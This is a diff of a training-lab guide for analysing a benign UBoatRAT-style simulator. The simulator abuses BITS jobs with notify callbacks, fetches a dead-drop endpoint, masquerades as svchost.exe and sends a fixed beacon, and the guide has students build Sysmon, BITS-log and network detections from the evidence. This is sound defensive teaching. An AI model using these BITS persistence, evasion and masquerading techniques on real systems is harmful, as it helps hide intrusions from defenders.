@@ -1,881 +1,1676 @@
 ![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
 
-# UBoatRAT — BITS-Based C2 and Exfiltration
+# UBoatRAT — BITS Job Abuse, Dead-Drop Resolution, and One-Shot Beacon Analysis
 
-# Windows VM · Ubuntu VM
+## Windows VM · Ubuntu VM
 
-## The objective of this lab is to reconstruct the behavioral fingerprint of UBoatRAT through guided dynamic analysis, reproduce its BITS-based command-and-control and exfiltration mechanism manually in a controlled environment, and build detection capabilities across Windows event sources and Sigma.
+## Objective
 
----
+In this lab, you will reconstruct a restricted, benign simulation of UBoatRAT-style behavior through dynamic analysis.
 
-### Documentation and Scenario
+You will investigate how a suspicious executable:
 
-**What is UBoatRAT?**
+- creates a BITS download job;
+- uses `SetNotifyCmdLine` to launch a callback after the transfer;
+- retrieves an encoded endpoint from a controlled dead-drop resolver;
+- copies itself under the system-like name `svchost.exe` in a user-writable directory;
+- sends one fixed XOR-encoded beacon to a private Ubuntu VM;
+- leaves process, network, file-system, BITS, Sysmon, and Windows Security telemetry behind.
 
-UBoatRAT is a Remote Access Tool (RAT) first publicly documented by Palo Alto Networks Unit42 in October 2017. It was deployed in targeted campaigns against gaming organisations in East Asia. Its name originates from the submarine-themed interface of its command-and-control panel.
+You will then reproduce the individual mechanisms manually and build detection logic around the observed evidence.
 
-Operationally, UBoatRAT demonstrates layered sophistication. Before executing its payload, it interrogates the target's network environment to confirm it is running on a victim host rather than an analysis sandbox. Rather than hardcoding the C2 server address into the binary — which static analysis would trivially expose — it uses a publicly accessible GitHub page as a **dead drop resolver**: a benign-looking URL that stores an encoded C2 address the malware retrieves at runtime. Once it has the C2 address, it delegates all file transfers to **Background Intelligent Transfer Service (BITS)** — a legitimate Windows component — rather than making direct socket connections from its own process.
-
-That last design choice is the focus of this lab.
-
-**MITRE ATT&CK Mapping:**
-
-| Technique | ID | Tactic |
-|---|---|---|
-| BITS Jobs | T1197 | Persistence, Defense Evasion |
-| Scheduled Task/Job | T1053.005 | Persistence, Execution |
-| Ingress Tool Transfer | T1105 | Command and Control |
-| Exfiltration Over C2 Channel | T1041 | Exfiltration |
-| Dead Drop Resolver | T1102.001 | Command and Control |
-
-**What is BITS?**
-
-Background Intelligent Transfer Service is a built-in Windows component designed for asynchronous, bandwidth-throttled file transfers. It is the same mechanism Windows Update uses to download patches in the background without degrading foreground network performance. BITS is managed by the Service Control Manager and runs hosted inside **svchost.exe**.
-
-From an attacker's perspective, BITS offers three structural advantages over rolling a custom HTTP client:
-
-*Process attribution evasion*: Every BITS job, regardless of which process created it, executes under `svchost.exe`. A defender tracking outbound network connections by originating process name will see `svchost.exe` making HTTP connections — indistinguishable at a first glance from a Windows Update check.
-
-*Firewall and proxy traversal*: BITS uses standard HTTP/HTTPS over ports 80 and 443. Outbound firewall rules almost never block these, and corporate proxies are preconfigured to forward them. No special egress rule is needed.
-
-*Built-in persistence without registry writes*: BITS jobs persist across reboots until explicitly completed or cancelled. An incomplete job silently retries on a configurable schedule. No registry run key, no startup folder entry, and no additional scheduled task are required — the BITS service itself maintains the retry queue as part of its normal operation.
-
-**Key Concepts:**
-
-- *BITS Job*: An asynchronous file transfer task registered with the BITS service. A job carries a name, a list of files (each with a source URL and a destination path), a transfer type (download or upload), and a state that progresses through: Queued → Connecting → Transferring → Transferred → Acknowledged (Complete). A job can also be Suspended or in an Error state at any stage.
-
-- *bitsadmin.exe*: A command-line utility for creating and managing BITS jobs. Marked deprecated in favour of PowerShell cmdlets, it nonetheless ships on every current Windows build and appears frequently in documented attack toolchains, valued precisely for its ubiquity.
-
-- *Start-BitsTransfer*: The PowerShell-native BITS interface. Supports synchronous and asynchronous downloads, uploads, and complete job lifecycle management through the `BitsTransfer` module.
-
-- *BITS Operational Log*: The Windows event log `Microsoft-Windows-Bits-Client/Operational` records all BITS job lifecycle events — creation, transfer start, completion, errors. It is the primary dedicated forensic source for this technique and the foundation of the detections you will build in Part III.
-
-- *Transfer Type*: BITS supports `/download` (pulling files from a remote server to local disk) and `/upload` (pushing local files to a remote server accepting HTTP PUT). UBoatRAT uses both: download for pulling C2 payloads and instructions, upload for exfiltration.
-
->[!NOTE]
-> No UBoatRAT binary is distributed or used in this lab. The simulation file deployed by the setup script replicates the **observable behavioral footprint** of UBoatRAT's BITS-based transfer mechanism, based exclusively on published threat intelligence. You will analyse behaviour, not malware code. There is no malware in this environment.
+> [!IMPORTANT]
+> This lab does **not** distribute or execute UBoatRAT malware.
+>
+> `WinSvcHelper.exe` is a purpose-built educational simulator. It does not implement:
+>
+> - remote command execution;
+> - an interactive shell;
+> - credential collection;
+> - system reconnaissance;
+> - file collection or exfiltration;
+> - HTTP upload;
+> - scheduled-task persistence;
+> - registry-based persistence;
+> - a command-and-control response channel.
+>
+> The simulator sends one fixed benign message and never reads a response.
 
 ---
 
-### SCENARIO
+## Scenario
 
-Your SOC has triaged an alert from an endpoint. An unusual executable appeared in `C:\Users\Public\Downloads\` on a Windows 11 workstation. The analyst who flagged it had already run it, reporting that "it didn't seem to do anything." The machine is isolated and available for live forensic analysis.
+Your SOC has isolated a Windows 11 workstation after an analyst discovered an unsigned executable named `WinSvcHelper.exe`.
 
-Your role shifts across the three parts of this lab, following the same progression a real security team works through from initial triage to operational prevention:
+The analyst launched it once and reported that no window appeared and no visible output was produced. The endpoint and a second Ubuntu VM are now available for controlled investigation.
 
-- **Part I — Behavioral Analysis**: You are a malware analyst. You have the suspicious file and a full analysis toolkit. You must determine what the file does — through evidence alone, before anyone tells you.
-- **Part II — Technique Reproduction**: You are a red team operator. You now know the technique. You will reproduce it manually, command by command, to build deep mechanical understanding of how it works at every layer.
-- **Part III — Detection Engineering**: You are a detection engineer. You will build the rules that would have caught this before the SOC alert was ever needed.
+You will work through the same evidence from three operational perspectives:
 
->[!IMPORTANT]
-> The setup scripts for both VMs have already been run and a snapshot has been taken. When you finish the lab, close your session — the environment resets to the snapshot automatically.
+- **Part I — Behavioral Analysis:** determine what the executable does from observable evidence;
+- **Part II — Technique Reproduction:** reproduce the BITS callback, resolver, and beacon mechanisms manually;
+- **Part III — Detection Engineering:** build host and network detections from the resulting telemetry.
 
----
-
-## PART I — BEHAVIORAL ANALYSIS
-
-*You are a malware analyst. You have received a suspicious executable. You do not yet know what it does.*
+The two VMs are disposable. Their setup scripts were run before the shared snapshot was created. When the lab session is closed, both VMs revert to that snapshot.
 
 ---
 
-### Phase 1: Lab Initialization
+## Laboratory Architecture
 
-Before touching the suspicious file, record the Ubuntu VM's IP address. You will need it throughout the lab to correlate network traffic.
+```text
+Windows VM                                      Ubuntu VM
+----------                                      ---------
 
-1. On the **Ubuntu VM**, open the terminal. Note your IP address and start the C2 listener:
+WinSvcHelper.exe
+      |
+      +--> runtime\svchost.exe
+      |
+      +--> runtime\init.bat
+                  |
+                  +--> bitsadmin.exe
+                          |
+                          +--> BITS download
+                                  |
+                                  +---- HTTP/8080 ----> /c2/trigger.dat
+                                  |
+                                  +--> notify callback
+                                          |
+                                          +--> runtime\svchost.exe
+                                               --bits-callback
+                                                   |
+                                                   +---- HTTP/8080 ---->
+                                                   |     /resolver/README.md
+                                                   |
+                                                   +---- TCP/9001 ----->
+                                                         fixed XOR beacon
+```
 
-<img width="641" height="871" alt="image" src="https://github.com/user-attachments/assets/d0635fba-bf7a-41e3-9ecf-8a071ca94e77" />
+Ubuntu exposes only:
+
+```text
+GET/HEAD /health
+GET/HEAD /c2/trigger.dat
+GET/HEAD /resolver/README.md
+TCP/9001 fixed-beacon receiver
+```
+
+The server rejects HTTP upload methods and does not return commands over TCP.
+
+---
+
+## Relevant Concepts
+
+### BITS jobs
+
+Background Intelligent Transfer Service is a native Windows service for asynchronous file transfers. Applications register jobs with BITS, and the service performs the network transfer in the background.
+
+A BITS job contains:
+
+- a display name;
+- a transfer type;
+- one or more remote and local file paths;
+- a current state;
+- optional notification behavior.
+
+The simulator creates a download job named:
+
+```text
+UBoatLab_Persistence
+```
+
+The name is an observable training indicator. It is not intended to represent a production naming convention.
+
+### `SetNotifyCmdLine`
+
+A BITS job may register a program and arguments to execute when the transfer reaches a notification state.
+
+The simulator registers:
+
+```text
+C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\svchost.exe
+```
+
+with:
+
+```text
+--bits-callback
+```
+
+The callback is therefore launched by the BITS workflow rather than as a direct long-lived child of the original simulator.
+
+### Dead-drop resolver
+
+The Ubuntu server publishes:
+
+```text
+/resolver/README.md
+```
+
+The file contains a marker in this format:
+
+```text
+[Rudeltaktik]<BASE64_VALUE>!
+```
+
+The Base64 value decodes to:
+
+```text
+<UBUNTU_PRIVATE_IP>:9001
+```
+
+The simulator accepts the decoded target only when:
+
+- it is IPv4;
+- it is inside an RFC1918 private range;
+- it matches the address resolved for `uboat-c2.test`;
+- the port is exactly `9001`.
+
+### Fixed beacon
+
+The callback sends only:
+
+```text
+488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL
+```
+
+Each byte is XOR-encoded with:
+
+```text
+0x88
+```
+
+The Ubuntu server decodes the data, validates the exact fixed message, logs it, and closes the connection without replying.
+
+---
+
+## ATT&CK-Oriented Behavior Mapping
+
+| Behavior demonstrated in this lab | ATT&CK technique |
+|---|---|
+| Creation and use of a BITS job | T1197 — BITS Jobs |
+| Download of an inert remote file | T1105 — Ingress Tool Transfer |
+| Retrieval of an encoded endpoint from a hosted text resource | T1102.001 — Dead Drop Resolver |
+| Copying an executable under the name `svchost.exe` outside Windows directories | T1036 — Masquerading |
+
+> [!NOTE]
+> This table maps the behaviors reproduced by this simulator. It is not a complete mapping of every behavior attributed to historical UBoatRAT samples.
+
+---
+
+# PART I — BEHAVIORAL ANALYSIS
+
+*You are the malware analyst. Build the behavioral picture from evidence before reading the simulator source.*
+
+---
+
+## Phase 1 — Initialize the Lab Session
+
+### Step 1 — Start the Ubuntu server manually
+
+On the Ubuntu VM, identify the private address used to communicate with Windows:
+
+```bash
+ip -brief -4 address show scope global
+```
+
+Record it as:
+
+```text
+<UBUNTU_PRIVATE_IP>
+```
+
+Start the server:
 
 ```bash
 cd ~/BnB/UBoatRAT
-python3 ubuntu_c2_server.py
+
+python3 ubuntu_c2_server.py \
+  --bind <UBUNTU_PRIVATE_IP> \
+  --advertise-ip <UBUNTU_PRIVATE_IP>
 ```
 
-Leave this terminal open and running for the entire duration of the lab. The server must be active before the simulation executes.
+Leave this terminal open for the entire lab session.
 
-2. On **Windows**, open a **PowerShell terminal as Administrator** and run the lab setup script:
+<!-- SCREENSHOT PLACEHOLDER:
+Ubuntu terminal showing:
+- selected private IPv4 address;
+- HTTP listener on TCP/8080;
+- beacon listener on TCP/9001;
+- generated resolver endpoint.
+-->
 
-<img width="589" height="442" alt="image" src="https://github.com/user-attachments/assets/205706cb-7719-4070-8c22-0e6e606760d1" />
+From a second Ubuntu terminal, optionally confirm that both ports are listening:
 
-- Run the lab setup script and fIll in the **Ubuntu IP** when prompted : 
+```bash
+ss -lntp |
+  grep -E ':(8080|9001)\b'
+```
+
+### Step 2 — Initialize Windows
+
+Open **Windows PowerShell 5.1 as Administrator**.
 
 ```powershell
-cd Desktop\Labs\UBoatRAT
-.\lab_start.ps1
+cd "C:\Users\Administrator\Desktop\Labs\UBoatRAT"
+
+.\lab_start.ps1 -UbuntuIP <UBUNTU_PRIVATE_IP>
 ```
-Wait for the last green **[+]** before continuing.
 
-<img width="892" height="254" alt="image" src="https://github.com/user-attachments/assets/f5e03990-d793-4476-97da-58fbd1387364" />
+The script:
 
->[!NOTE]
-> `lab_start.ps1` verifies that the BITS Operational Log is enabled (`wevtutil sl Microsoft-Windows-Bits-Client/Operational /e:true`), confirms Sysmon is running, and enables Process Creation auditing via `auditpol /set /subcategory:"Process Creation" /success:enable`. These are prerequisites for Part III. On a real endpoint, these would be an analyst's first configuration steps before starting any dynamic analysis session.
+- validates the Ubuntu address as RFC1918;
+- maps `uboat-c2.test` to the Ubuntu address;
+- verifies TCP/8080 and TCP/9001;
+- verifies `/health`, `/c2/trigger.dat`, and `/resolver/README.md`;
+- removes only previous UBoatRAT runtime artifacts;
+- removes only the `UBoatLab_Persistence` BITS job;
+- enables the BITS Operational log;
+- enables Security Event ID 4688 with command-line recording;
+- applies `sysmon_uboatrat.xml` for the current disposable VM session;
+- writes `lab_session.json`;
+- does **not** execute `WinSvcHelper.exe`.
+
+Wait until the script reports successful initialization.
+
+<!-- SCREENSHOT PLACEHOLDER:
+Windows PowerShell showing the final successful lab_start.ps1 output,
+including:
+- PowerShell 5.1 Desktop;
+- hostname validation;
+- TCP/8080 and TCP/9001 checks;
+- resolver validation;
+- Sysmon action;
+- clean BITS baseline.
+-->
+
+### Step 3 — Record the session information
+
+```powershell
+Get-Content .\lab_session.json |
+  ConvertFrom-Json |
+  Format-List
+```
+
+Store the session start time for later event queries:
+
+```powershell
+$Session = Get-Content .\lab_session.json |
+  ConvertFrom-Json
+
+$SessionStart = [datetime]$Session.SessionStartUtc
+$UbuntuIP = $Session.UbuntuIP
+```
 
 ---
 
-### Phase 2: Pre-Execution Baseline
+## Phase 2 — Establish a Clean Baseline
 
-Establish a clean baseline across every tool before executing the suspicious file. Baseline data lets you subtract normal system noise and isolate exactly what the file introduces.
-
-**Step 1 — Inspect the suspicious file:**
+### Step 1 — Inspect the suspicious executable
 
 ```powershell
-Get-Item ".\WinSvcHelper.exe" |
+Get-Item .\WinSvcHelper.exe |
   Select-Object Name, Length, CreationTime, LastWriteTime
 
-(Get-AuthenticodeSignature ".\WinSvcHelper.exe").Status
+Get-FileHash .\WinSvcHelper.exe -Algorithm SHA256
 
-(Get-Item ".\WinSvcHelper.exe").VersionInfo
+Get-AuthenticodeSignature .\WinSvcHelper.exe |
+  Select-Object Status, StatusMessage
+
+(Get-Item .\WinSvcHelper.exe).VersionInfo
 ```
 
-<img width="1199" height="479" alt="image" src="https://github.com/user-attachments/assets/c2c42cb9-181c-456d-b969-90ff7068ef04" />
+Record:
 
-Record your findings. Is the file signed? Does it carry version metadata? What is its size? These become comparison data points for Phase 8.
+- file size;
+- SHA-256;
+- signing status;
+- version metadata;
+- timestamps.
 
-**Step 2 — Baseline the BITS job queue:**
+<!-- SCREENSHOT PLACEHOLDER:
+PowerShell showing WinSvcHelper.exe metadata, hash, and signing status.
+-->
+
+### Step 2 — Confirm that no runtime exists
+
+```powershell
+Test-Path .\runtime
+```
+
+Expected baseline:
+
+```text
+False
+```
+
+Also verify that no previous session artifacts remain:
+
+```powershell
+@(
+  ".\runtime",
+  ".\UBoatRAT_Lab_Blocked.log"
+) |
+  ForEach-Object {
+    [pscustomobject]@{
+      Path   = $_
+      Exists = Test-Path $_
+    }
+  }
+```
+
+### Step 3 — Baseline the specific BITS job
+
+```powershell
+Import-Module BitsTransfer
+
+Get-BitsTransfer -AllUsers |
+  Where-Object {
+    $_.DisplayName -eq "UBoatLab_Persistence"
+  } |
+  Format-List *
+```
+
+Expected baseline: no matching job.
+
+A read-only full queue view is also available:
 
 ```powershell
 bitsadmin /list /allusers
 ```
 
-<img width="736" height="180" alt="image" src="https://github.com/user-attachments/assets/cd4661b6-d7e8-4ddd-92d2-4b96c95ad03c" />
+Do not cancel unrelated jobs.
 
-No jobs are listed, record this as your clean state. Any new job appearing after execution is an artefact of the suspicious file.
+<!-- SCREENSHOT PLACEHOLDER:
+PowerShell or bitsadmin showing that UBoatLab_Persistence does not exist.
+-->
 
-**Step 3 — Start Process Monitor:**
+### Step 4 — Open Process Monitor
 
-Open **Process Monitor** from `C:\Tools\Procmon\Procmon.exe`. Allow it to run for ten seconds to collect baseline system noise, then pause capture with **CTRL+E**. Do not clear the events — the noise contrast will help distinguish normal activity from attack activity later.
+Start:
 
-<img width="1177" height="545" alt="image" src="https://github.com/user-attachments/assets/d748c8d8-7270-4989-ae00-b5de6d6a8658" />
-
-**Step 4 — Start Wireshark:**
-
-Open **Wireshark**. When selecting your capture interface, look for the one showing active network traffic — it will have a live sparkline next to its name in the interface list. This is typically labeled **Ethernet** (the primary virtual NIC assigned to your Windows VM). Avoid **VMware Network Adapter** entries (VMnet8, VMnet1, etc.) — these are internal virtual adapters that carry no inter-VM traffic between Windows and Ubuntu. If you are unsure which interface is active, hold **CTRL** and select multiple interfaces simultaneously, then narrow down after your first test capture.
-
-Begin capturing and apply the display filter:
-
-```
-ip.addr == <UBUNTU_IP>
+```powershell
+C:\Tools\Procmon\Procmon64.exe
 ```
 
-<img width="410" height="316" alt="image" src="https://github.com/user-attachments/assets/fbdeb04f-c62d-487f-b36a-607b225c451d" />
+Allow Procmon to collect normal system activity for approximately ten seconds. Pause capture with **CTRL+E**.
 
-<img width="808" height="625" alt="image" src="https://github.com/user-attachments/assets/75ac8c41-3244-43b0-b550-755a4c501cd1" />
+Do not clear the existing events yet.
 
-This shows only traffic to and from the Ubuntu VM — your simulated C2 server. Leave the capture running.
+Recommended columns:
+
+- Time of Day;
+- Process Name;
+- PID;
+- Operation;
+- Path;
+- Result;
+- Detail.
+
+<!-- SCREENSHOT PLACEHOLDER:
+Procmon open with baseline activity and capture paused.
+-->
+
+### Step 5 — Open Process Explorer
+
+Start:
+
+```powershell
+C:\Tools\ProcessExplorer\procexp64.exe
+```
+
+Enable these columns where available:
+
+- Process;
+- PID;
+- Parent PID;
+- Command Line;
+- Image Path;
+- Company Name.
+
+The callback process may be short-lived. Process Explorer is supplementary; Sysmon and Procmon provide persistent evidence after the process exits.
+
+### Step 6 — Start packet capture
+
+Open Wireshark and select the Windows interface that communicates with Ubuntu.
+
+Apply:
+
+```text
+ip.addr == <UBUNTU_PRIVATE_IP> &&
+(tcp.port == 8080 || tcp.port == 9001)
+```
+
+Start capture.
+
+On Ubuntu, a parallel capture may be used:
+
+```bash
+sudo tcpdump -ni any \
+  "host <WINDOWS_PRIVATE_IP> and (tcp port 8080 or tcp port 9001)" \
+  -w ~/BnB/UBoatRAT/captures/uboatrat_lab.pcap
+```
+
+<!-- SCREENSHOT PLACEHOLDER:
+Wireshark actively capturing with the UBoatRAT display filter.
+-->
 
 ---
 
-### Phase 3: Execution and Capture
+## Phase 3 — Execute and Capture
 
-Before executing the suspicious file, ensure both tools are actively recording.
+Resume Procmon with **CTRL+E**.
 
-- In Wireshark, confirm the capture is running with the display filter applied.
+Confirm Wireshark is still capturing.
 
-<img width="808" height="277" alt="image" src="https://github.com/user-attachments/assets/8b1fb817-fa57-4c52-a8f1-40d680e9b353" />
-
-- In Process Monitor, press CTRL+E (or click the magnifying glass icon) to unpause and resume capturing. The number of events recorded by **Procmon** should start rising.
-
-<img width="802" height="255" alt="image" src="https://github.com/user-attachments/assets/d855fd02-aec3-45d3-8637-04bde28cb30f" />
-
-With both tools active, execute the file in your Administrator PowerShell:
-
-In your **Administrator PowerShell**:
+From the Administrator PowerShell:
 
 ```powershell
-cd C:\Users\Administrator\Desktop\Labs\UBoatRAT
+cd "C:\Users\Administrator\Desktop\Labs\UBoatRAT"
+
 .\WinSvcHelper.exe
 ```
 
-<img width="1907" height="938" alt="image" src="https://github.com/user-attachments/assets/d1ab49d3-688d-4a27-872a-90ce62b9ebbf" />
+The program is built as a windowless executable. It may return no terminal output.
 
-The file produces no visible output. No window opens. No message appears. The prompt returns immediately.
+Wait approximately 30 seconds.
 
-**Wait 30 seconds** without interacting with any tool. BITS jobs are asynchronous — they may be queued rather than actively transferring at the moment of creation. 
+Then:
 
-After 30 seconds:
+- pause Procmon with **CTRL+E**;
+- stop Wireshark;
+- leave the Ubuntu server running.
 
-- Return to wireshark and press the STOP button :
-  
-<img width="902" height="246" alt="image" src="https://github.com/user-attachments/assets/f4972bfe-2d7e-4e49-a9f7-de363da9607f" />
-
-- Return to Procmon and press **CTRL+E** to stop capture, or use the GUI.
-
-<img width="920" height="266" alt="image" src="https://github.com/user-attachments/assets/8ff32872-ac3a-474a-b458-9ca0f6a5f02d" />
-
----
-
-### Phase 4: Process Tree Analysis (Procmon)
-
-With Procmon and Wireshark stopped, examine what happened.
-
-**Step 1 — Apply process filters:**
-
-Press **CTRL+L** in the Procmon window and configure using the drop-down menu:
-
-- `Process Name` | `is` | `WinSvcHelper.exe` → Include
-
-<img width="960" height="628" alt="image" src="https://github.com/user-attachments/assets/85ee99e3-2aca-4e92-8eb1-d62a6d82eda3" />
-
-- `Process Name` | `is` | `powershell.exe` → Include
-
-<img width="958" height="626" alt="image" src="https://github.com/user-attachments/assets/6093cbce-bf38-4666-9488-863236adbc37" />
-
-- `Process Name` | `is` | `svchost.exe` → Include
-
-<img width="958" height="623" alt="image" src="https://github.com/user-attachments/assets/da1629e6-62fe-4293-a829-9ee6b4f326e6" />
-
-Apply and examine the filtered event list.
-
-**Step 2 — Examine the process tree:**
-
-The problem with looking at the process creation timeline to find the first instance of *WinSvcHelper.exe* is the sample size. It's like finding a needle in a haystack. However, we have tools. Go to **Tools -> Proccess Tree**:
-
-<img width="872" height="430" alt="image" src="https://github.com/user-attachments/assets/d637aecf-4202-41cb-94e9-067b8b9cc6a1" />
-
-Scroll down and try to find **WinSvcHelper.exe**. Look at the `Process Name` and `PID` columns across the captured events:
-
-<img width="828" height="683" alt="image" src="https://github.com/user-attachments/assets/8175751d-fc20-4b2b-b7a6-1c065bebe80a" />
-
-1. Did `WinSvcHelper.exe` spawn any child processes? What are they?
-2. Is `powershell.exe` among them? What is its parent PID?
-3. Is `svchost.exe` active? What operation types does it show?
-
-Here we find that **WinSvcHelper.exe** spawned **Powershell**.
-Close the process tree for the moment. 
-
-**Before proceeding, document your answers:**
-
-- [ ] What process executed the initial logic?
-- [ ] What child process was spawned, if any?
-
----
-
-### Phase 5: Network Traffic Analysis (Wireshark)
-
-Switch to **Wireshark**. Your display filter `ip.addr == <UBUNTU_IP>` is still active.
-
-**Step 1 — Follow the HTTP stream:**
-
-Locate any HTTP traffic in the packet list. Right-click a packet and select **Follow → HTTP Stream**. This shows the full application-layer exchange.
-
-1. What HTTP method was used — GET or PUT?
-2. What is the **User-Agent** string in the request headers?
-3. What URI paths were requested?
-4. Is there both inbound activity (download) and outbound activity (upload)?
-
->[!NOTE]
-> The User-Agent string is your most immediate indicator of which component generated this traffic. A standard BITS transfer uses a User-Agent string of the form `Microsoft BITS/X.X`. Compare this against what `Invoke-WebRequest`, `curl`, or a browser sends — they are distinct strings. That difference tells you something specific about which Windows subsystem opened this connection, and it is not the suspicious executable itself.
-
-**Step 2 — Identify the source process:**
-
-Open **Process Explorer** from `C:\Tools\ProcessExplorer\procexp.exe`. Locate instances of `svchost.exe`. Right-click the one showing active or recent network connections and select **Properties → TCP/IP** tab.
-
-1. Is there a connection entry from `svchost.exe` to `<UBUNTU_IP>`?
-2. Under the **Services** tab of the same Properties dialog: is `BITS` or `BITSSvc` listed among the services hosted in this `svchost.exe` instance?
-
-**Before proceeding, document your answers:**
-
-- [ ] What User-Agent string confirmed which Windows component was responsible for the traffic?
-- [ ] What files were downloaded, and from what URI paths?
-- [ ] Was any upload traffic observed? What was sent, and to which URI path?
-
----
-
-### Phase 6: BITS Operational Log Analysis
-
-Examine the dedicated BITS event log to see the job lifecycle record — independent of Procmon and Wireshark.
-
-**Navigate in Event Viewer to:**
-
-```
-Applications and Services Logs
-  → Microsoft
-    → Windows
-      → Bits-Client
-        → Operational
-```
-
-Or query directly from PowerShell:
+Check whether the runtime directory now exists:
 
 ```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
-  Sort-Object TimeCreated |
-  Select-Object TimeCreated, Id,
-    @{N='Summary'; E={ ($_.Message -split '\r?\n' | Select-Object -First 3) -join ' | ' }} |
+Get-ChildItem .\runtime -Force |
+  Select-Object Name, Length, LastWriteTime
+```
+
+<!-- SCREENSHOT PLACEHOLDER:
+PowerShell showing the runtime directory and its generated artifacts.
+-->
+
+---
+
+## Phase 4 — Reconstruct the Process Chain
+
+### Step 1 — Use Procmon Process Tree
+
+In Procmon:
+
+```text
+Tools → Process Tree
+```
+
+Locate:
+
+```text
+WinSvcHelper.exe
+```
+
+Identify its direct descendants.
+
+Expected initial execution chain:
+
+```text
+powershell.exe
+└── WinSvcHelper.exe
+    └── cmd.exe
+        └── bitsadmin.exe
+```
+
+The callback is a separate execution caused by the BITS workflow:
+
+```text
+runtime\svchost.exe --bits-callback
+```
+
+It may not appear as a direct child of the original simulator.
+
+<!-- SCREENSHOT PLACEHOLDER:
+Procmon Process Tree showing WinSvcHelper.exe, cmd.exe, and bitsadmin.exe.
+-->
+
+### Step 2 — Filter Procmon
+
+Open the filter dialog with **CTRL+L**.
+
+Add include rules for:
+
+```text
+Process Name is WinSvcHelper.exe
+Process Name is cmd.exe
+Process Name is bitsadmin.exe
+Process Name is svchost.exe
+```
+
+Also add:
+
+```text
+Path contains \Desktop\Labs\UBoatRAT\
+```
+
+Review:
+
+- `Process Create`;
+- `Process Start`;
+- file creation;
+- file writes;
+- reads from `init.bat`;
+- operations involving `runtime`.
+
+### Step 3 — Query Sysmon Event ID 1
+
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  Id        = 1
+  StartTime = $SessionStart
+} |
+  ForEach-Object {
+    $Xml = [xml]$_.ToXml()
+    $Data = $Xml.Event.EventData.Data
+
+    [pscustomobject]@{
+      Time        = $_.TimeCreated
+      Image       = ($Data | Where-Object Name -eq "Image")."#text"
+      CommandLine = ($Data | Where-Object Name -eq "CommandLine")."#text"
+      ParentImage = ($Data | Where-Object Name -eq "ParentImage")."#text"
+      ProcessGuid = ($Data | Where-Object Name -eq "ProcessGuid")."#text"
+    }
+  } |
+  Sort-Object Time |
   Format-Table -AutoSize -Wrap
 ```
 
-**Step 1 — Job creation (Event ID 3):**
+Identify:
 
-Locate events with ID **3**. What is the job name? Who is the owner?
+- the original simulator;
+- `cmd.exe` executing `runtime\init.bat`;
+- `bitsadmin.exe` commands containing `UBoatLab_Persistence`;
+- `runtime\svchost.exe --bits-callback`.
 
-**Step 2 — Transfer start (Event ID 59):**
+### Questions
 
-Locate events with ID **59** (transfer started). Extract structured details:
+- [ ] Which process started the execution chain?
+- [ ] Which process created the BITS job?
+- [ ] What command line launched the callback?
+- [ ] Why is the callback not necessarily a direct child of the original simulator?
+- [ ] Which executable is named `svchost.exe`, and where is it located?
+
+---
+
+## Phase 5 — Analyze File-System Artifacts
+
+List the generated runtime:
 
 ```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
-  Where-Object { $_.Id -eq 59 } |
+Get-ChildItem .\runtime -Force |
+  Sort-Object LastWriteTime |
+  Select-Object LastWriteTime, Length, Name
+```
+
+Expected artifacts may include:
+
+```text
+runtime\svchost.exe
+runtime\UBoatRAT_LAB.marker
+runtime\init.bat
+runtime\bitsadmin.log
+runtime\execution.log
+runtime\uboat_lab_trigger.dat
+runtime\callback.log
+runtime\resolver_response.txt
+runtime\beacon.sent
+```
+
+An `error.log` may appear if execution failed.
+
+### Step 1 — Inspect the generated BITS bootstrap
+
+```powershell
+Get-Content .\runtime\init.bat
+```
+
+Locate:
+
+```text
+/create /download
+/addfile
+/setnotifycmdline
+/resume
+```
+
+Record:
+
+- job name;
+- source URL;
+- destination path;
+- callback executable;
+- callback arguments.
+
+<!-- SCREENSHOT PLACEHOLDER:
+init.bat open in PowerShell or a text editor with the BITS commands visible.
+-->
+
+### Step 2 — Inspect command output
+
+```powershell
+Get-Content .\runtime\bitsadmin.log
+```
+
+Look for:
+
+- job creation result;
+- file registration result;
+- callback registration result;
+- resume result;
+- errors.
+
+### Step 3 — Inspect simulator logs
+
+```powershell
+Get-Content .\runtime\execution.log
+Get-Content .\runtime\callback.log
+```
+
+Check for:
+
+- resolved private address;
+- copied executable path;
+- callback start;
+- resolver download;
+- decoded endpoint;
+- fixed beacon result;
+- confirmation that no response was read.
+
+### Step 4 — Query Sysmon Event ID 11
+
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  Id        = 11
+  StartTime = $SessionStart
+} |
   ForEach-Object {
-    $xml = [xml]$_.ToXml()
-    $data = $xml.Event.EventData.Data
-    [PSCustomObject]@{
-      Time       = $_.TimeCreated
-      JobName    = ($data | Where-Object { $_.Name -eq 'name' }).'#text'
-      RemoteUrl  = ($data | Where-Object { $_.Name -eq 'url' }).'#text'
-      LocalFile  = ($data | Where-Object { $_.Name -eq 'localName' }).'#text'
-      BytesTotal = ($data | Where-Object { $_.Name -eq 'bytesTotal' }).'#text'
+    $Xml = [xml]$_.ToXml()
+    $Data = $Xml.Event.EventData.Data
+
+    [pscustomobject]@{
+      Time           = $_.TimeCreated
+      Image          = ($Data | Where-Object Name -eq "Image")."#text"
+      TargetFilename = ($Data | Where-Object Name -eq "TargetFilename")."#text"
+      ProcessGuid    = ($Data | Where-Object Name -eq "ProcessGuid")."#text"
     }
-  } | Format-Table -AutoSize -Wrap
+  } |
+  Sort-Object Time |
+  Format-Table -AutoSize -Wrap
 ```
 
-1. What is the source URL? **This is the C2 server address.**
-2. What is the destination file path?
+### Questions
 
-**Step 3 — Completion (Event ID 60):**
-
-Locate events with ID **60**. How many bytes were transferred?
-
-**Step 4 — Upload activity:**
-
-Are there additional job names in the log beyond the first download job? Check for a second job used for upload. If present: what was sent, and to what destination URL?
-
-**Before proceeding, document your answers:**
-
-- [ ] The C2 server IP and port extracted from the source URL in Event ID 59
-- [ ] The filename downloaded from the C2
-- [ ] Whether a BITS upload job was observed and what it transferred
-- [ ] The full name(s) of all BITS jobs created
+- [ ] Which files were created before the BITS transfer started?
+- [ ] Which file was downloaded through BITS?
+- [ ] Which process created each artifact?
+- [ ] Why is `runtime\svchost.exe` suspicious despite its familiar name?
